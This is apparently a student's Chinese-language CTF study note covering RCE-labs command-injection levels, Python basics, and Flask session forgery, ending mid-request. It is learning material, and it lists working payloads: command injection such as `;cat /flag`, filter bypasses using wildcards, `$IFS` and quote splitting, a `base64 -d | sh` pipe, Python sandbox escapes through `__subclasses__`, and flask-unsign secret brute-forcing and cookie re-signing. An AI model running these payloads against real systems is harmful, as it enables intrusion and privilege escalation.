# 25-web-trke-1105 学习笔记：RCE（续）、Python、flask_session、SQL 注入、XSS、XXE、SSRF

> 时间：2026-11-05  
> 承接：`25-web-trke-1101.md`  
> 内容：RCE-labs Level 0–8、Python 语言第一/二节、flask_session 伪造、第一节 SQL 注入、XSS、XXE、SSRF  

## 目录

1. RCE（续）：RCE-labs Level 0 到 Level 8
2. Python 语言第一节：基础语法
3. Python 语言第二节：函数、模块、类与 Flask 初识
4. flask_session 伪造
5. 第一节 SQL 注入

---

# RCE（续）：从 RCE-labs Level 0 到 Level 8
>
> 靶场：<https://github.com/ProbiusOfficial/RCE-labs>

## RCE-labs 关卡总览

| 关卡 | 考点 | 关键 payload / 操作 |
| --- | --- | --- |
| Level 0 | 热身，认识代码执行与命令执行 | 页面直接给 flag |
| Level 1 | `eval()` 代码执行 | `a=system('ls /')`（已记录） |
| Level 2 | 随机函数 + `eval` + `$flag` | `?action=r` 重置到 `eval`，POST `content=system("echo $flag")` |
| Level 3 | `system()` 命令执行 | `a=ls /`、`a=cat /flag`（已记录） |
| Level 4 | 命令拼接符 | `?ip=127.0.0.1;cat /flag` |
| Level 5 | 关键字过滤 + 引号拼接 | `?cmd=cat /fl""ag` |
| Level 6 | 通配符 + 命令路径 | `?cmd=/???/?a??64 /??a?` |
| Level 7 | 空格过滤 | `?cmd=cat%09/fl""ag`、`cat$IFS/fl""ag`、`cat</fl""ag` |
| Level 8 | 输出重定向 | `?cmd=cat /flag;` 或 `?cmd=cat /flag||` |


---

## 1. RCE-labs Level 0

### RCE-labs Level 0 思路

打开靶场，flag 直接显示在页面上，不需要构造 payload：

- **代码执行（Code Execution）**：让 PHP / Python 解释器执行一段“代码字符串”，比如 `eval('system("ls");')`、`assert('...')`。
- **命令执行（Command Execution）**：让操作系统的 shell 执行一条命令，比如 `system('ls /')`、`exec('cat /flag')`。

页面源码里通常有 `include("get_flag.php")`、`eval()`、`system()` 的写法。前者是把 flag 文件包含进来，后两者才是真正能被攻击者利用的“执行入口”。

### 总结

- RCE = 远程代码执行 + 远程命令执行，最终效果都是“在目标机器上执行我们想要的东西”。
- 代码执行漏洞的入口：`eval()`、`assert()`、`preg_replace()` 的 `/e`、`create_function()`、`call_user_func()` 等。
- 命令执行漏洞的入口：`system()`、`exec()`、`passthru()`、`shell_exec()`、反引号、`popen()`、`proc_open()`、`pcntl_exec()`。

---

## 2. RCE-labs Level 2

### RCE-labs Level 2 思路

从一组函数里随机挑一个作为“执行函数”，存进 session，然后用 `eval` 去调用它：

```php
// 大致逻辑
$random_func = ['eval', 'assert', 'call_user_func', 'array_map', 'array_reduce', ...][rand(...)];
$_SESSION['func'] = $random_func;

$code = $random_func . '(' . $content . ');';
eval($code);
```

只有随机到 `eval` 时，我们才能比较自由地执行 PHP 代码。所以第一步是“刷”出 `eval`：

```http
GET /?action=r HTTP/1.1
Host: <靶场地址>
Cookie: PHPSESSID=<保持同一个会话>
```

`?action=r` 会执行 `session_unset()` / `session_destroy()`，把随机函数重置。反复刷新，直到页面提示：

```text
获得新的函数: eval
```

**关键：重置和提交必须使用同一个 Cookie / 同一个 session**，否则函数又变了。

拿到 `eval` 后，改发 POST：

```http
POST /?action=submit HTTP/1.1
Host: <靶场地址>
Cookie: PHPSESSID=<同一个会话>
Content-Type: application/x-www-form-urlencoded

content=system("echo $flag")
```

`content` 被拼成 `eval(system("echo $flag"));`，`system()` 先执行 `echo $flag`，把 flag 打印出来。

也可以写成：

```text
content='echo $flag;'
content=var_dump($flag)
content=print_r($flag)
```

第一种会拼成 `eval('echo $flag;');`，语义最干净；第二种、第三种直接打印 PHP 变量。

### 总结

- `$flag` 在 `get_flag.php` 里被 `include` 进来，是全局变量，所以能直接被 `echo` / `var_dump`。
- 随机函数存在 session 里，**重置和利用要带同一个 Cookie**。
- 遇到代码执行框，优先试：`system("cat /flag")`、`echo $flag`、`var_dump($flag)`、`print_r(scandir('/'))`。
- `eval()` 的参数必须是合法 PHP 代码；`system()` 的参数是 shell 命令，两者可以嵌套。

---

## 3. RCE-labs Level 4

### RCE-labs Level 4 思路

页面是一个 ping 测试功能，用户输入 IP，后台执行：

```php
system("ping -c 3 " . $ip);
```

没有任何过滤，直接使用 Linux 命令拼接符：

```http
GET /?ip=127.0.0.1;cat /flag HTTP/1.1
Host: <靶场地址>
```

后台实际执行：

```bash
ping -c 3 127.0.0.1;cat /flag
```

`;` 表示“前一条命令执行完，接着执行后一条”，无论前一条成功与否。页面会先显示 ping 结果，再显示 flag。

如果 `;` 被浏览器 / 中间件处理，可以 URL 编码成 `%3B`：

```text
?ip=127.0.0.1%3Bcat%20/flag
```

也可以换成其他拼接符：

```text
?ip=127.0.0.1|cat /flag
?ip=127.0.0.1&&cat /flag
?ip=127.0.0.1||cat /flag
?ip=127.0.0.1%0Acat /flag
```

### 总结

Linux 常见命令拼接符：

| 符号 | 作用 |
| --- | --- |
| `;` | 顺序执行，前一条不影响后一条 |
| `&&` | 前一条成功（返回码 0）才执行后一条 |
| `\|\|` | 前一条失败才执行后一条 |
| `\|` | 管道，前一条的输出作为后一条的输入 |
| `&` | 把前一条丢到后台，立刻执行后一条 |
| `%0a` | 换行，等价于新起一条命令 |

Windows 下常用 `&`、`&&`、`|`、`||`，没有 `;`。实际测试时先判断目标系统：路径分隔符、`ping -c` 与 `ping -n`、`/etc/passwd` 与 `C:\Windows\win.ini` 都能帮助判断。

---

## 4. RCE-labs Level 5

### RCE-labs Level 5 思路

这一关开始过滤关键字，直接 `cat /flag` 会被拦。绕过思路是 **用 shell 的引号拼接把关键字拆开**：

```http
GET /?cmd=cat%20/fl""ag HTTP/1.1
Host: <靶场地址>
```

shell 在执行前会先做“引号移除”：

```bash
cat /fl""ag   ->   cat /flag
```

所以 `""` 里的内容为空，`fl` 和 `ag` 被重新拼成 `flag`，但 WAF 看到的是 `fl""ag`，匹配不到 `flag`。

同类写法：

```text
?cmd=cat /fl''ag
?cmd=cat /fl$*ag
?cmd=cat /f*
?cmd=cat /f??????
```

如果过滤的是 `cat` 而不是 `flag`，也可以拆命令：

```text
?cmd=c""at /flag
?cmd=/bin/c""at /flag
```

### 总结

- shell 会先处理引号：`''`、`""` 都会把里面的内容原样保留，然后拼回一个整体。
- 关键字过滤只匹配“原始字符串”，所以 `fl""ag`、`fl''ag`、`fl\ag` 都能还原成 `flag`。
- `*`、`?` 是通配符：`/f*` 匹配 `/flag`，`/f??????` 匹配长度为 6 且以 f 开头的文件。
- 这一关**shell 的解析顺序在 WAF 之后**。

---

## 5. RCE-labs Level 6

### RCE-labs Level 6 思路

`b` 到 `z`、大写字母和大量符号都被禁用，只剩小写 `a`、数字、`?`、`/` 等少量字符可用。`cat /flag` 里的 `c`、`t`、`f`、`l`、`g` 全部被拦。

利用 Linux 的 **单字符通配符 `?`**，从绝对路径去匹配命令和文件：

```text
/???/?a?      -> /bin/cat
/??a?         -> /flag
```

所以：

```http
GET /?cmd=/???/?a?%20/??a? HTTP/1.1
Host: <靶场地址>
```

等价于：

```bash
/bin/cat /flag
```

但 `/???/?a?` 不一定只匹配 `cat`，也可能匹配 `/bin/tar` 等，输出可能不干净。更稳的是用 `base64`：

```text
/???/?a??64   -> /bin/base64
/??a?         -> /flag
```

payload：

```http
GET /?cmd=/???/?a??64%20/??a? HTTP/1.1
Host: <靶场地址>
```

页面返回一段 base64，例如：

```text
ZmxhZ3s4OGJlN2Y5ZDBiZWU0NjZmYTBkOGYwZDAxMDg1M2VjOX0=
```

本地解码：

```bash
echo 'ZmxhZ3s4OGJlN2Y5ZDBiZWU0NjZmYTBkOGYwZDAxMDg1M2VjOX0=' | base64 -d
```

### 总结

- `?` 只匹配 **一个字符**，且主要用于路径匹配；不能直接写 `?a?` 当命令名，要写绝对路径 `/???/?a?`。
- `/???/` 匹配 `/bin/`，`?a?` 匹配 `cat`，`/??a?` 匹配 `/flag`。
- `base64` 的名字里有数字，能用 `?a??64` 精确匹配，输出也更干净。
- 通配符绕过的前提是：**目标路径 / 命令真实存在**，先 `ls /`、`echo /???` 探测。

---

## 6. RCE-labs Level 7

### RCE-labs Level 7 思路

这一关在 Level 5 的基础上过滤空格。空格不能用，就用其他“空白字符 / 分隔方式”代替：

**方法一：TAB（`%09`）**

```http
GET /?cmd=cat%09/fl""ag HTTP/1.1
Host: <靶场地址>
```

`%09` 是水平制表符，shell 把它和空格一样当作参数分隔符。

**方法二：`$IFS`**

```text
?cmd=cat$IFS/fl""ag
?cmd=cat${IFS}/fl""ag
```

`IFS` 是 shell 的内部字段分隔符，默认包含空格、TAB、换行。`$IFS` 展开后就是空白，所以 `cat$IFS/flag` 等价于 `cat /flag`。

**方法三：重定向 `<`**

```text
?cmd=cat</fl""ag
```

`<` 把文件内容重定向到 `cat` 的标准输入，不需要空格。

**方法四：花括号扩展（bash）**

```text
?cmd={cat,/fl""ag}
```

bash 会把 `{cat,/flag}` 展开成两个词 `cat` 和 `/flag`。

**方法五：`$'...'` 编码空格**

```text
?cmd=X=$'cat\x20/flag'&&$X
```

### 总结

- 空格过滤的替代：`%09`、`$IFS`、`${IFS}`、`<`、`{cmd,arg}`、`$'...'`。
- `%20` 有时也会被过滤，`%09` 更稳；如果 `%09` 也被拦，优先试 `$IFS` 和 `<`。
- 这一关通常还叠加了 `flag` 关键字过滤，所以 payload 里同时用了 `/fl""ag`。
- **shell 的分词发生在命令执行前，WAF 的分词不一定和 shell 一样。**

---

## 7. RCE-labs Level 8

### RCE-labs Level 8 思路

后端代码在命令后面自动追加了输出重定向：

```php
system($cmd . ">/dev/null 2>&1");
```

`>/dev/null` 把标准输出丢进黑洞，`2>&1` 把标准错误也指向同一个地方。所以直接 `?cmd=cat /flag` 页面没有回显。

**绕过一：用 `;` 截断**

```http
GET /?cmd=cat%20/flag; HTTP/1.1
Host: <靶场地址>
```

拼接后：

```bash
cat /flag;>/dev/null 2>&1
```

`;` 结束了 `cat` 命令，后面的重定向变成一个独立的空命令，`cat` 的输出正常回显。

**绕过二：用 `||` 短路**

```text
?cmd=cat /flag||
```

拼接后：

```bash
cat /flag||>/dev/null 2>&1
```

`cat` 成功时，`||` 右边不执行，输出保留；即使右边执行，也只是一个重定向空命令，不会影响前面的输出。

**绕过三：先写文件再读**

```text
?cmd=cat /flag>/tmp/flag.txt;cat /tmp/flag.txt;
```

或者：

```text
?cmd=cp /flag ./flag.txt
```

然后浏览器访问 `/flag.txt`。

### 总结

- 重定向会把 stdout / stderr 吞掉，但 **命令本身仍然执行了**。
- `;`、`||`、`&&` 都能改变“追加的重定向”作用的位置。
- 无回显时还可以：写文件、`curl` 外带、DNSLog、base64 后回显、延时盲注。

---

## 8. RCE 绕过方法总表

| 过滤点 | 绕过方式 | 示例 |
| --- | --- | --- |
| 空格 | `%09`、`$IFS`、`${IFS}`、`<`、`{cmd,arg}` | `cat$IFS/flag` |
| 关键字 `flag` | 引号拼接、通配符 | `cat /fl""ag`、`cat /f*` |
| 命令名 `cat` | 绝对路径、通配符、变量 | `/bin/cat`、`/???/?a?` |
| 字母 / 数字被限 | 通配符、base64、`$1` | `/???/?a??64`、`ca$1t` |
| 输出被重定向 | `;`、`||`、写文件 | `cat /flag;` |
| 无回显 | 写文件、外带、延时 | `cat /flag>/tmp/x;cat /tmp/x` |
| 黑名单函数 | 反引号、`popen`、`proc_open`、`pcntl_exec` | `` echo `ls` `` |

常用“编码 / 拼接”技巧：

```bash
# base64 解码后交给 shell
echo Y2F0IC9mbGFn | base64 -d | sh

# 变量拼接
a=fl;b=ag;cat /$a$b

# 位置参数为空，等价于拆字符
ca$1t /fl$1ag

# 反引号等价于 shell_exec
echo `cat /flag`
```

---

# Python 语言第一节：基础语法


## 1. 运行方式

```bash
python app.py          # 运行脚本
python -c "print(1)"   # 执行一行代码
python                 # 进入 REPL，输入 exit() 退出
```

Python 用**缩进**表示代码块，通常 4 个空格。没有 `{}`，也没有 `;`（一行写多条语句才用 `;`）。

```python
if True:
    print("hello")
else:
    print("world")
```

## 2. 变量与基本数据类型

Python 是动态类型语言，变量不需要声明类型：

```python
age = 18            # int
price = 9.9         # float
name = "hnusec"     # str
is_admin = True     # bool
nothing = None      # NoneType

print(type(age))    # <class 'int'>
```

| 类型 | 示例 | 说明 |
| --- | --- | --- |
| `int` | `1`、`0x10`、`0b1010` | 整数，支持二 / 八 / 十六进制 |
| `float` | `1.5`、`1e3` | 浮点数 |
| `str` | `"abc"`、`'abc'` | 字符串，不可变 |
| `bool` | `True`、`False` | 布尔值，`True == 1` |
| `None` | `None` | 空值 |

类型转换：

```python
int("123")      # 123
str(123)        # "123"
list("abc")     # ['a', 'b', 'c']
bool(0)         # False
bool("")        # False
bool("0")       # True（非空字符串就是 True）
```

## 3. 字符串

```python
s = "Hello, CTF"

print(s[0])          # H
print(s[-1])         # F
print(s[0:5])        # Hello（左闭右开）
print(s[::-1])       # FTC ,olleH（反转）
print(len(s))        # 10
print(s.upper())     # HELLO, CTF
print(s.lower())     # hello, ctf
print(s.replace("CTF", "Web"))
print(s.split(", ")) # ['Hello', 'CTF']
print("flag" in s)   # False
```

三种写法：

```python
name = "admin"
print("hello " + name)
print("hello %s" % name)
print(f"hello {name}")   # f-string，最常用
```

转义：

```python
print("a\tb")       # 制表符
print("a\nb")       # 换行
print(r"C:\Users")  # 原始字符串，反斜杠不转义
```

> 读文件、拼 URL、构造 JSON 时，f-string 最方便；但把用户输入直接 f-string 进 SQL / 命令 / 模板，就是漏洞的起点。

## 4. 列表、元组、字典、集合

### 4.1 列表 list

有序、可变、可重复：

```python
nums = [1, 2, 3]
nums.append(4)          # [1, 2, 3, 4]
nums[0] = 100           # [100, 2, 3, 4]
print(nums[1:3])        # [2, 3]
print(nums[-1])         # 4
nums.remove(2)          # 删除值 2
last = nums.pop()       # 弹出最后一个
```

### 4.2 元组 tuple

有序、不可变：

```python
point = (10, 20)
x, y = point            # 解包
```

### 4.3 字典 dict

键值对，键必须是不可变类型：

```python
user = {"username": "admin", "role": "guest"}
print(user["username"])
user["role"] = "admin"          # 修改
user["age"] = 18                # 新增
print(user.get("email", "无"))  # 取不到给默认值
print(user.keys())
print(user.values())
print(user.items())
```

### 4.4 集合 set

无序、不重复，常用于去重：

```python
s = {1, 2, 2, 3}
print(s)                # {1, 2, 3}
s.add(4)
s.remove(1)
print(2 in s)           # True
```

### 4.5 推导式

```python
nums = [1, 2, 3, 4, 5]
squares = [x * x for x in nums]              # [1, 4, 9, 16, 25]
evens = [x for x in nums if x % 2 == 0]      # [2, 4]
mapping = {x: x * x for x in nums}           # {1: 1, 2: 4, ...}
```

## 5. 运算符与逻辑

```python
print(7 / 2)    # 3.5
print(7 // 2)   # 3（整除）
print(7 % 2)    # 1（取余）
print(2 ** 10)  # 1024

print(1 == 1)   # True
print(1 != 2)   # True
print(1 < 2 < 3)  # True，可以链式比较

print(True and False)  # False
print(True or False)   # True
print(not True)        # False
```

`is` 与 `==` 的区别：

- `==` 比较**值**是否相等。
- `is` 比较**是不是同一个对象**（内存地址）。

```python
a = [1, 2]
b = [1, 2]
print(a == b)   # True
print(a is b)   # False
```

## 6. 流程控制

```python
score = 85

if score >= 90:
    print("A")
elif score >= 60:
    print("B")
else:
    print("C")
```

```python
for i in range(5):          # 0 1 2 3 4
    print(i)

for index, value in enumerate(["a", "b", "c"]):
    print(index, value)

for name, age in zip(["admin", "guest"], [18, 20]):
    print(name, age)

i = 0
while i < 3:
    print(i)
    i += 1
```

`break` 结束整个循环，`continue` 跳过本次进入下一次。

## 7. 输入输出与文件

```python
name = input("请输入用户名：")
print(f"hello {name}")
```

文件读写建议用 `with`，会自动关闭文件：

```python
with open("flag.txt", "r", encoding="utf-8") as f:
    content = f.read()
    print(content)

with open("result.txt", "w", encoding="utf-8") as f:
    f.write("hello\n")
```

按行读：

```python
with open("urls.txt", "r", encoding="utf-8") as f:
    for line in f:
        print(line.strip())
```

JSON：

```python
import json

data = {"username": "admin", "role": "guest"}
text = json.dumps(data, ensure_ascii=False)
print(text)                       # {"username": "admin", "role": "guest"}

obj = json.loads(text)
print(obj["username"])            # admin
```

## 8. 异常处理

程序报错时如果不处理，会直接退出。用 `try/except` 捕获：

```python
try:
    num = int("abc")
except ValueError as e:
    print("转换失败：", e)
finally:
    print("无论如何都会执行")
```

常见异常：

| 异常 | 场景 |
| --- | --- |
| `ValueError` | 类型对但值不对，如 `int("abc")` |
| `TypeError` | 类型不对，如 `1 + "2"` |
| `KeyError` | 字典键不存在 |
| `IndexError` | 列表下标越界 |
| `FileNotFoundError` | 文件不存在 |
| `requests.exceptions.RequestException` | 请求异常 |

## 9. 第一节小练习

**练习 1：读文件找 flag**

```python
with open("/flag", "r", encoding="utf-8", errors="ignore") as f:
    for line in f:
        if "flag{" in line:
            print(line.strip())
```

**练习 2：批量请求 URL**

```python
import requests

urls = ["http://127.0.0.1:8080/", "http://127.0.0.1:8081/"]

for url in urls:
    try:
        r = requests.get(url, timeout=3)
        print(url, r.status_code, len(r.text))
    except Exception as e:
        print(url, "error", e)
```

### 总结

- Python 的语法核心：缩进、动态类型、`for ... in ...`、列表 / 字典、f-string。
- 容器四件套：`list` 有序可变、`tuple` 有序不可变、`dict` 键值对、`set` 去重。
- 文件读写用 `with open(..., encoding="utf-8")`，不要依赖系统默认编码（Windows 默认 GBK，很容易乱码）。

---

# Python 语言第二节：函数、模块、类与 Flask 初识

## 1. 函数

```python
def add(a, b):
    return a + b

print(add(1, 2))   # 3
```

默认参数、关键字参数、可变参数：

```python
def greet(name, prefix="hello"):
    return f"{prefix}, {name}"

print(greet("admin"))                 # hello, admin
print(greet("admin", prefix="hi"))    # hi, admin

def show(*args, **kwargs):
    print(args)      # 元组，位置参数
    print(kwargs)    # 字典，关键字参数

show(1, 2, a=3, b=4)
```

`*args` 收集多余的位置参数，`**kwargs` 收集多余的关键字参数。

作用域：

```python
x = 1

def f():
    global x
    x = 2

f()
print(x)   # 2
```

函数内部默认读不到也改不了全局变量，要改必须 `global`。

匿名函数：

```python
square = lambda x: x * x
print(square(5))   # 25

nums = [3, 1, 2]
nums.sort(key=lambda x: -x)
print(nums)        # [3, 2, 1]
```

## 2. 模块与包

一个 `.py` 文件就是一个模块：

```python
# tools.py
def scan(url):
    print("scan", url)
```

```python
# main.py
import tools
tools.scan("http://example.com")

from tools import scan
scan("http://example.com")

import tools as t
t.scan("http://example.com")
```

包是带 `__init__.py` 的文件夹（Python 3.3+ 可以没有，但建议保留）。`if __name__ == "__main__":` 用来区分“直接运行”和“被 import”：

```python
def main():
    print("running")

if __name__ == "__main__":
    main()
```

安装第三方库：

```bash
pip install requests flask
pip install -r requirements.txt
pip list
```

虚拟环境：

```bash
python -m venv venv
# Windows
venv\Scripts\activate
# Linux / macOS
source venv/bin/activate
```

> 做 CTF / 渗透脚本时，第三方库能省很多事：`requests` 发请求、`beautifulsoup4` 解析 HTML、`pwntools` 打二进制、`flask-unsign` 伪造 session。

## 3. 类与对象

```python
class User:
    def __init__(self, username, role="guest"):
        self.username = username
        self.role = role

    def is_admin(self):
        return self.role == "admin"

    def __str__(self):
        return f"User({self.username}, {self.role})"


u = User("admin", "admin")
print(u.username)      # admin
print(u.is_admin())    # True
print(u)               # User(admin, admin)
```

继承：

```python
class Admin(User):
    def __init__(self, username):
        super().__init__(username, role="admin")

    def delete_user(self, user):
        print(f"{self.username} deletes {user.username}")


a = Admin("root")
print(a.is_admin())    # True
```

常见魔术方法：

| 方法 | 触发时机 |
| --- | --- |
| `__init__` | 创建对象时 |
| `__str__` | `print(obj)` / `str(obj)` |
| `__repr__` | 调试输出 |
| `__len__` | `len(obj)` |
| `__getitem__` | `obj[key]` |
| `__call__` | `obj()` |

> 反序列化漏洞里经常看到 `__destruct`、`__wakeup`、`__toString` 这类魔术方法；Python 的 `__reduce__` 也常在 pickle 反序列化里出现。现在先知道“这些方法会在特定时机自动调用”即可。

## 4. 常用标准库

```python
import os
import sys
import json
import re
import time
import base64
import hashlib
import random

print(os.getcwd())              # 当前目录
print(os.listdir("."))          # 列目录
print(os.environ.get("PATH"))   # 环境变量
print(sys.argv)                 # 命令行参数
print(base64.b64encode(b"flag").decode())
print(hashlib.md5(b"123456").hexdigest())
print(re.findall(r"\d+", "a1b22c333"))
```

`requests` 是写 EXP 最常用的库：

```python
import requests

r = requests.get("http://example.com", timeout=5)
print(r.status_code)
print(r.text)
print(r.headers)

r = requests.post("http://example.com/login", data={"username": "admin", "password": "123456"})
r = requests.get("http://example.com", params={"id": "1"})
r = requests.get("http://example.com", cookies={"session": "xxx"})
r = requests.get("http://example.com", headers={"User-Agent": "Mozilla/5.0"})
```

## 5. Python 中的危险函数（RCE 视角）

Python 本身也会出现“代码执行 / 命令执行”：

```python
eval("1 + 1")                  # 执行表达式
exec("import os; os.system('id')")  # 执行语句块
os.system("id")                # 执行 shell 命令
os.popen("id").read()          # 执行命令并读输出
subprocess.run("id", shell=True)
subprocess.check_output("id", shell=True)
```

危险点在于**把用户输入拼进去**：

```python
# 错误示范：用户可控 code
code = request.args.get("code")
eval(code)          # 直接 RCE

# 错误示范：用户可控 ip
ip = request.args.get("ip")
os.system("ping -c 3 " + ip)   # 命令注入
```

安全写法：

- 不要 `eval` / `exec` 用户输入；必须解析表达式时用 `ast.literal_eval`。
- 不要 `shell=True` 拼字符串；用列表参数 `subprocess.run(["ping", "-c", "3", ip])`。
- 对 IP、域名、文件名做白名单校验。

其他“看起来不是 RCE，实际能 RCE”的入口：

| 入口 | 风险 |
| --- | --- |
| `pickle.loads(user_data)` | 反序列化执行任意代码 |
| `yaml.load(user_data)` | 旧版 PyYAML 可构造 `!!python/object/apply` |
| `eval` / `exec` | 直接执行代码 |
| `os.system` / `subprocess(shell=True)` | 命令注入 |
| `render_template_string(user_input)` | Jinja2 SSTI，最终也能 RCE |

### 5.1 Python 沙箱绕过（拓展）

有些题目不直接给 `eval`，而是给一个“表达式计算器”，并过滤了 `os`、`system`、`import` 等关键字。核心思路是**从任意对象出发，沿继承链找到能执行命令的类 / 函数**：

```python
# 最基本的：eval 环境里直接导入
__import__('os').system('id')

# 从空元组出发找 object 的所有子类
().__class__.__bases__[0].__subclasses__()

# 常见目标：os._wrap_close（下标随 Python 版本变化，需先列出来找）
[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ == '_wrap_close'][0].__init__.__globals__['system']('id')
```

- `__class__` 拿类型，`__bases__` 拿父类，`__subclasses__()` 拿所有子类，`__globals__` 拿函数所在模块的全局变量（里面有 `system`、`popen`）。
- 过滤了关键字可以用字符串拼接、`getattr()`、`chr()`、`__builtins__['__import__']`、base64 解码后再 `eval`。
- 这类题的下标依赖 Python 版本，**先在目标环境打印子类列表**，再确认 `_wrap_close` 或 `catch_warnings` 的下标，不要背一个固定数字。

防御：不要用 `eval` / `exec` 处理用户输入；必须做表达式解析时用 `ast.literal_eval`，并在容器 / 低权限用户下运行。

## 6. 最小 Flask 应用

Flask 是 Python 的轻量 Web 框架，后面 `flask_session` 伪造就是围绕它。

安装：

```bash
pip install flask
```

`app.py`：

```python
from flask import Flask, request

app = Flask(__name__)

@app.route("/")
def index():
    return "hello flask"

@app.route("/greet")
def greet():
    name = request.args.get("name", "guest")
    return f"hello, {name}"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
```

运行：

```bash
python app.py
```

访问 `http://127.0.0.1:5000/greet?name=admin`，返回 `hello, admin`。

路由参数：

```python
@app.route("/user/<username>")
def user(username):
    return f"user: {username}"
```

请求方法：

```python
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        return f"{username}:{password}"
    return "GET"
```

## 7. Flask session 初体验

Flask 默认的 session 是**客户端 session**：数据序列化后签名，放在 Cookie 里，不是像 PHP 那样只在 Cookie 里放一个 `PHPSESSID`。

```python
from flask import Flask, session, redirect, url_for

app = Flask(__name__)
app.secret_key = "dev-secret-key-123"   # 签名用的密钥

@app.route("/login/<name>")
def login(name):
    session["username"] = name
    session["role"] = "admin" if name == "admin" else "guest"
    return redirect(url_for("index"))

@app.route("/")
def index():
    return f"user={session.get('username')}, role={session.get('role')}"
```

访问 `/login/guest` 后，浏览器会收到一个 `session` Cookie，长这样：

```text
session=eyJyb2xlIjoiZ3Vlc3QiLCJ1c2VybmFtZSI6Imd1ZXN0In0.Z0... 
```

它由三段组成：

```text
base64(payload).timestamp.signature
```

- `payload`：`{"role":"guest","username":"guest"}` 经过压缩 / base64。
- `timestamp`：签名时间。
- `signature`：用 `SECRET_KEY` 做的 HMAC。

**关键：Flask 默认只签名，不加密。** 任何人拿到 Cookie 都能解出明文；但不知道 `SECRET_KEY` 就改不了内容，因为服务端会验签。

### 总结

- 函数：`def`、默认参数、`*args` / `**kwargs`、`lambda`、作用域。
- 模块：`import`、`from ... import ...`、`if __name__ == "__main__"`、`pip` / `venv`。
- 类：`__init__`、`self`、继承、魔术方法。
- 危险函数：`eval` / `exec` / `os.system` / `subprocess(shell=True)` / `pickle.loads`，用户可控就是 RCE。
- Flask：`app.route`、`request.args` / `request.form`、`session`、`app.secret_key`。
- **Flask 默认 session = 客户端签名 Cookie，不是服务端存储。** 

---

# flask_session 伪造

## 1. Flask session 和 PHP session 的区别

| | PHP 默认 session | Flask 默认 session |
| --- | --- | --- |
| Cookie 里放什么 | `PHPSESSID`（一个 ID） | 整个 session 数据 + 签名 |
| 数据存哪 | 服务器端文件 / Redis | 客户端 Cookie |
| 能不能直接看到内容 | 不能，只有 ID | 能，解 base64（必要时解压）就是明文 |
| 篡改后能不能生效 | 改 ID 没用 | 没有 `SECRET_KEY` 改不了，有就能重签 |
| 关键凭据 | session 文件 / session 存储 | `SECRET_KEY` |

所以 Flask 的“session 伪造”本质是：**拿到 `SECRET_KEY` → 改 session 字典 → 重新签名 → 把新 Cookie 发给服务器。**

## 2. Flask session Cookie 的结构

Flask 使用 `itsdangerous` 的 `URLSafeTimedSerializer`，默认参数：

- 序列化器：`TaggedJSONSerializer`
- 签名算法：`HMAC-SHA1`
- 盐（salt）：`cookie-session`
- 结构：`base64(payload).timestamp.signature`

伪代码：

```python
payload = base64url(json.dumps(session_dict))        # 有时还会先 zlib 压缩
timestamp = int(time.time())
signature = HMAC_SHA1(secret_key, payload + "." + timestamp)  # 实际还带 salt
cookie = payload + "." + timestamp + "." + signature
```

> 不同 Flask 版本、不同配置（`SESSION_SERIALIZER`、`PERMANENT_SESSION_LIFETIME`）细节会变，但“payload.timestamp.signature”三段式和“HMAC + SECRET_KEY”不变。用工具解码最稳。

## 3. 利用条件

1. 目标使用 Flask 默认的客户端 session（没有改成 Redis / 数据库 session）。
2. session 里存了权限字段，比如 `role`、`is_admin`、`username`、`user_id`。
3. 能拿到 `SECRET_KEY`，或者密钥很弱能爆破。
4. 服务端只验签，不额外校验 session 内容。

## 4. SECRET_KEY 的常见获取方式

| 方式 | 说明 |
| --- | --- |
| 源码泄露 | `.git`、备份文件、`app.py`、`config.py`、注释 |
| 报错 / debug 页面 | Flask debug 模式会泄露源码片段、环境变量 |
| 环境变量 | `os.environ["SECRET_KEY"]`，可通过 SSRF / 文件读取拿到 |
| SSTI | `{{ config }}`、`{{ config['SECRET_KEY'] }}` |
| 弱密钥爆破 | `secret`、`dev`、`changeme`、`flask`、题目名、字典 |
| 可预测随机数 | `random.seed(uuid.getnode())` 之类，需要复现种子 |
| 客户端泄露 | 前端 JS、Cookie 其他字段、响应头 |

## 5. 工具：flask-unsign

安装：

```bash
pip install flask-unsign
```

解码（不需要密钥）：

```bash
flask-unsign --decode --cookie 'eyJyb2xlIjoiZ3Vlc3QifQ.Z0...'
```

输出：

```text
{'role': 'guest'}
```

爆破密钥：

```bash
flask-unsign --unsign --cookie '<COOKIE>' --wordlist keys.txt
```

成功会输出：

```text
[+] Found secret: peanut butter
```

直接用服务器地址爆破（工具会自己发请求拿 Cookie）：

```bash
flask-unsign --unsign --server 'http://target/' --wordlist keys.txt
```

伪造：

```bash
flask-unsign --sign --cookie "{'role': 'admin'}" --secret 'peanut butter'
```

指定 salt（有些题改了默认 salt）：

```bash
flask-unsign --sign --cookie "{'role': 'admin'}" --secret 'xxx' --salt 'cookie-session'
```

另一个工具 `flask-session-cookie-manager`：

```bash
python3 flask_session_cookie_manager3.py decode -c '<COOKIE>' -s '<SECRET_KEY>'
python3 flask_session_cookie_manager3.py encode -t "{'role':'admin'}" -s '<SECRET_KEY>'
```

## 6. WP1：PicoCTF Most Cookies

> 题目：picoCTF 2021 `Most Cookies`，writeup：<https://ctftime.org/writeup/27050>
>
> 目标：把 `very_auth` 从 `blank` 改成 `admin`，访问 `/display` 拿 flag。

### 思路

1. 打开网站，用 Burp 看 Cookie，发现是 Flask 的 `session`。
2. 题目源码里给了一组“饼干名字”作为候选密钥：`snickerdoodle`、`chocolate chip`、`peanut butter` 等。
3. 用这组名字做字典，爆破 `SECRET_KEY`。
4. 解出原 session：`{'very_auth': 'blank'}`。
5. 改成 `{'very_auth': 'admin'}`，用爆破出的密钥重签。
6. 替换 Cookie，访问 `/display`。

### 操作

把 `server.py` 里 `cookie_names` 列表的原名保存为 `cookies.txt`，一行一个（下面是截取）：

```text
snickerdoodle
chocolate chip
oatmeal raisin
gingerbread
shortbread
peanut butter
sugar
macadamia
```

爆破：

```bash
flask-unsign --unsign --cookie '<原session>' --wordlist cookies.txt
```

得到（不同实例可能命中列表里的不同名字，本例是 `peanut butter`）：

```text
[+] Found secret: peanut butter
```

解码确认：

```bash
flask-unsign --decode --cookie '<原session>'
# {'very_auth': 'blank'}
```

伪造：

```bash
flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'peanut butter'
```

把输出的新 Cookie 替换到浏览器 / Burp，访问：

```http
GET /display HTTP/1.1
Host: <题目地址>
